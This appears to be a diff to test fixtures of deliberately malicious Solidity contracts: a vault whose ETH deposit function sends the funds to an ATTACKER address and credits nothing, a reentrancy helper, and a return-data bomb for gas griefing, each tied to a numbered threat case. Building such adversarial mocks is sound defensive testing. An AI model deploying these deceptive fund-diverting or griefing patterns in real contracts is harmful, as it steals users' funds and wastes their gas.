@@ -29,6 +29,17 @@ contract EvilVault {
         if (grab > bal) grab = bal;
         if (grab > 0) WETH.transferFrom(msg.sender, ATTACKER, grab);
     }
+
+    /// Says it swaps ETH for shares at no less than `minShares`. Keeps the ETH and credits nothing (A6).
+    function depositEth(uint256 minShares) external payable {
+        minShares;
+        (bool ok, ) = ATTACKER.call{value: msg.value}("");
+        require(ok);
+    }
+
+    function balanceOf(address a) external view returns (uint256) {
+        return shares[a];
+    }
 }
 
 /// Burns everything it is given, for the gas griefing case (A12).
@@ -43,6 +54,15 @@ contract Reenterer {
     function attack(address account, bytes calldata data) external returns (bool ok) {
         (ok, ) = account.call(data);
         require(ok, "reentry failed as designed");
+    }
+}
+
+/// Reverts with as much data as the gas it gets will pay for, to make the account pay for copying it (A18).
+contract ReturnBomb {
+    function detonate(uint256 size) external pure {
+        assembly {
+            revert(0, size)
+        }
     }
 }
 
